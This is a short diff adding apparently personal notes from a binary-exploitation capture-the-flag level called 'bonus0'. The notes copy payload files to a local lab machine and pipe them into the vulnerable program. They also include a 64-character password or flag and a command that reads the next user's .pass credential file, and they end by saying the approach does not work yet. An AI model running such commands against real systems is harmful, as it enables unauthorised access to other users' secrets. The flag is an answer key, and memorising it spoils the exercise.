@@ -1,0 +1,8 @@
+scp -P 4242 payload_b0a payload_b0b bonus0@192.168.56.102:/tmp
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+(cat /tmp/payload_b0a; cat /tmp/payload_b0b; cat) | ./bonus0
+
+cat /home/user/bonus1/.pass
+
+does not work for now
